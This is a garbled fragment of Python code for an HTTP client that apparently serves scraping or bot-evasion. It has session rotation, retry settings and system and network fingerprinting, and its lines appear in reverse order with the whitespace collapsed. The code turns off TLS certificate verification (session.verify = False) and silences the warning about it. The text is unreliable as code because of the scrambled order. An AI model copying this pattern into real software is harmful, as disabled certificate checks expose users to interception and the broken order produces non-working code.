requests.get(        try:        """Get external IP address"""    def get_external_ip(self):            return {}            print(f"⚠️  Network info error: {e}")        except Exception as e:            return info            }                'ssl_fingerprint': self.get_ssl_fingerprint()                'user_agent_entropy': self.calculate_ua_entropy(),                'ip_info': self.get_external_ip(),                'hostname': socket.gethostname() if socket else 'Unknown',                'platform': platform.system() if platform else 'Unknown',            info = {        try:        """Get network and system information for advanced fingerprinting"""    def get_network_info(self):        return None        """Get a random proxy - disabled to avoid IPv6 issues"""    def get_proxy(self):        return self.sessions[0] if self.sessions else requests.Session()            return random.choice(self.sessions)        if self.rotate_sessions and self.sessions:        """Get a random session from pool"""    def get_session(self):        return session            pass        except Exception:            session.verify = False            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)        try:        # Disable SSL warnings            print(f"⚠️  Retry strategy setup failed: {e}")        except Exception as e:            session.mount("https://", adapter)            session.mount("http://", adapter)                                  pool_connections=100, pool_maxsize=100)            adapter = HTTPAdapter(max_retries=retry_strategy,            )                status_forcelist=[429, 500, 502, 503, 504],                backoff_factor=1,                total=3,            retry_strategy = Retry(        try:        # Advanced retry strategy
